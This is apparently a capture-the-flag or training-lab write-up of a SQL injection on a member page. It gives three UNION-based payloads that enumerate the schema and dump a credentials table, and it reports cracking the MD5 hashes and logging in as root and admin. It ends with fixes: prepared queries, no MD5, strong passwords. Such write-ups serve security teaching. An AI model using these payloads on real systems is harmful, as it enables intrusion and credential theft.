# SQL injection and weak passwords

## Exploit
In the earlier SQL exploits we looked at the columns in the information schema. [Let's look at the tables this time](https://dev.mysql.com/doc/mysql-infoschema-excerpt/5.7/en/information-schema-tables-table.html)
On the member page:

```SQL
1=1 UNION SELECT table_schema, table_name FROM information_schema.columns       # Member_Brute_Force looks interesting
1=1 UNION SELECT table_schema, column_name FROM information_schema.columns      # it contains: id username password
1=1 UNION SELECT username, password FROM Member_Brute_Force.db_default          # Bingo!
```
We can see three users, a garbage one and two interesting ones, we decrypt their md5 password and we get `root:shadow` and `admin:shadow`.

We now can log in `${URL}/index.php?page=signin`

## Fix
- Use prepared SQL queries, refer to the other SQL exploits
- Don't use MD5
- Use [Strong passwords](https://en.wikipedia.org/wiki/Password_strength#Random_passwords)
